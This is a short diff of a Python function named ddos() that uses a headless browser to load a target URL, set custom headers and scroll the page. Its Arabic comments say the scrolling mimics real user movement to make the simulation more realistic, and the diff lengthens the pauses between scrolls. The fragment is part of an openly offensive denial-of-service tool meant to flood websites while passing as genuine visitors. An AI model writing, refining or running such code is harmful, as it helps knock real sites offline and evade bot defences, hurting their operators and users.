@@ -34,12 +34,14 @@ def ddos():
 
                 page.set_extra_http_headers(headers)
 
+                # محاولة الانتقال إلى الموقع مع انتظار لتحميل المحتوى
                 page.goto(url, wait_until="domcontentloaded", timeout=10000)
 
                 # محاكاة حركة المستخدم (scrolling) لجعل المحاكاة أكثر واقعية
-                page.mouse.wheel(0, 1000)
-                time.sleep(1)
-                page.mouse.wheel(0, -1000)
+                page.mouse.wheel(0, 1000)  # محاكاة تمرير الصفحة
+                time.sleep(2)  # انتظر قليلاً بعد التمرير
+                page.mouse.wheel(0, -1000)  # محاكاة التمرير إلى الأعلى
+                time.sleep(2)  # انتظر قليلاً بعد التمرير
 
                 print(f"Request sent to {url}, Status: Success")
 
